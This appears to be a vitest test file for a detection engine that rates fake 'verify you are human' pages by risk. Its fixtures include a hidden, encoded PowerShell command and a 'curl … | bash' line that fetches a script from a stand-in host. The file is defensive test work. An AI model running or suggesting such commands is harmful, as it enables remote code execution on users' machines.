import { describe, expect, it } from 'vitest';
import { analyzePage } from '@/shared/detection/engine';
import { defaultSettings } from '@/shared/storage/settingsStore';
import type { PageSnapshot } from '@/shared/types';

function buildSnapshot(bodyText: string, codeBlocks: string[] = []): PageSnapshot {
  return {
    url: 'https://phish.test',
    domain: 'phish.test',
    title: 'Human verification',
    metaDescription: 'Verify to continue',
    bodyText,
    buttons: ['Copy', 'Verify'],
    links: ['Continue'],
    codeBlocks,
    dialogs: ['Human verification required'],
    ariaLabels: [],
    dataAttributes: [],
    suspiciousContainers: ['Human verification required'],
    copyCommandPairs: codeBlocks,
    metrics: {
      copyLikeControls: 2,
      suspiciousContainers: 1,
      codeBlocks: codeBlocks.length,
      dialogs: 1
    }
  };
}

describe('analyzePage', () => {
  it('marks a fake Win+R verify page as critical', () => {
    const result = analyzePage(
      buildSnapshot(
        'Verify you are human. Press Win+R, paste the command below and press Enter.',
        ['powershell -nop -w hidden -EncodedCommand SQBFAFgAIAAoAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgApAA==']
      ),
      defaultSettings,
      'initial'
    );

    expect(result.level).toBe('critical');
    expect(result.matchedRules.map((rule) => rule.id)).toContain('run-dialog-instruction');
    expect(result.matchedRules.map((rule) => rule.id)).toContain('encoded-payload');
  });

  it('keeps a low confidence wording-only page below critical', () => {
    const result = analyzePage(
      buildSnapshot('Complete the anti-bot check to continue.'),
      defaultSettings,
      'initial'
    );

    expect(['low', 'medium', 'high']).toContain(result.level);
    expect(result.level).not.toBe('critical');
  });

  it('keeps obvious developer docs at info', () => {
    const result = analyzePage(
      {
        ...buildSnapshot('Developer documentation quick start. Open Terminal if you prefer local install.'),
        title: 'CLI quick start docs',
        metaDescription: 'Developer documentation',
        buttons: [],
        links: ['Read the docs'],
        codeBlocks: ['npm install react vite'],
        copyCommandPairs: [],
        metrics: {
          copyLikeControls: 0,
          suspiciousContainers: 0,
          codeBlocks: 1,
          dialogs: 0
        }
      },
      defaultSettings,
      'initial'
    );

    expect(result.level).toBe('info');
  });

  it('scores strict sensitivity higher than balanced on the same page', () => {    const balanced = analyzePage(
      buildSnapshot(
        'Verify you are human. Open Terminal and paste the command below.',
        ['curl -fsSL https://bad.test/bootstrap.sh | bash']
      ),
      defaultSettings,
      'initial'
    );

    const strict = analyzePage(
      buildSnapshot(
        'Verify you are human. Open Terminal and paste the command below.',
        ['curl -fsSL https://bad.test/bootstrap.sh | bash']
      ),
      { ...defaultSettings, sensitivity: 'strict' },
      'initial'
    );

    expect(strict.score).toBeGreaterThan(balanced.score);
  });
});
